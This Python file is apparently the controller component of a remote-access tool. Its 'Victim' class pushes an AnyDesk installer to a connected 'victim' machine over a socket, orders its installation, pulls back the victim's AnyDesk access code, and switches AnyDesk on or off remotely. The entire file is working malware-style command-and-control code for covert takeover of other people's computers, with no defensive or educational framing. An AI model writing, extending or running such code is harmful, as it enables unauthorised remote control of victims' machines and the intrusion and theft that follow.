import os
from constants import *


class Victim:

    code = None

    def __init__(self, socket, code=None):
        self.socket = socket
        self.code = code

    def getAddr(self):
        return self.socket.getsockname()

    def initialize(self):
        self._sendCommand(INSTALL_ANYDESK_COMMAND)
        self._installAnydesk()

        print(
            f"{self.getAddr()}: Waiting for the victim to install anydesk and send us the code!")
        print(f"{self.getAddr()}: Trying get the code...")

        code = self.socket.recv(9).decode()
        if code == ANYDESK_CODE_ERROR:
            print(f"{self.getAddr()}: There is no code for the vicitm")
            self.code = None
        else:
            print(f"{self.getAddr()}: The code of the victim is {code}")
            self.code = code

    def _installAnydesk(self):
        print(
            f"{self.getAddr()}: Sending the anydesk file to the victim...")

        fileSize = os.path.getsize(ANYDESK_FILE_PATH)
        self.socket.send(fileSize.to_bytes(4, "big"))

        with open(ANYDESK_FILE_PATH, 'rb') as anydeskFile:
            totalRead = 0
            read = 0

            while totalRead < fileSize:
                read = anydeskFile.read(1024)
                self.socket.send(read)
                totalRead += len(read)

        print(
            f"{self.getAddr()}: The anydesk file has been sent to the victim !")

    def getCode(self):
        print(f"{self.getAddr()}: Getting the code from the victim...")
        self._sendCommand(GET_CODE_COMMAND)

        code = self.socket.recv(9).decode()

        if code == ANYDESK_CODE_ERROR:
            print(f"{self.getAddr()}: There is no code for the vicitm")
            return None

        print(f"{self.getAddr()}: The code of the victim is {code}")
        return code

    def powerOnAnydesk(self):
        print(f"{self.getAddr()}: Powering on anydesk on the victim's pc")
        self._sendCommand(POWER_ON_ANYDESK_COMMAND)
        print(
            f"{self.getAddr()}: Anydesk will be powered on Immediately on the victim's pc")

    def powerOffAnydesk(self):
        print(f"{self.getAddr()}: Powering off anydesk on the victim's pc")
        self._sendCommand(POWER_OFF_ANYDESK_COMMAND)
        print(
            f"{self.getAddr()}: Anydesk will be powered off Immediately on the victim's pc")

    def _sendCommand(self, command):

        code = None

        if command == INSTALL_ANYDESK_COMMAND:
            code = INSTALL_ANYDESK_COMMAND_CODE

        elif command == GET_CODE_COMMAND:
            code = GET_CODE_COMMAND_CODE

        elif command == POWER_ON_ANYDESK_COMMAND:
            code = POWER_ON_ANYDESK_CODE

        elif command == POWER_OFF_ANYDESK_COMMAND:
            code = POWER_OFF_ANYDESK_CODE

        else:
            raise ValueError("Invalid command!")

        print(
            f"{self.getAddr()} Sending command to the victim - ({command}) ...")
        self.socket.send(code.to_bytes(4, "big"))
        print(
            f"{self.getAddr()} The Command has been sent to the victim - ({command}) !")
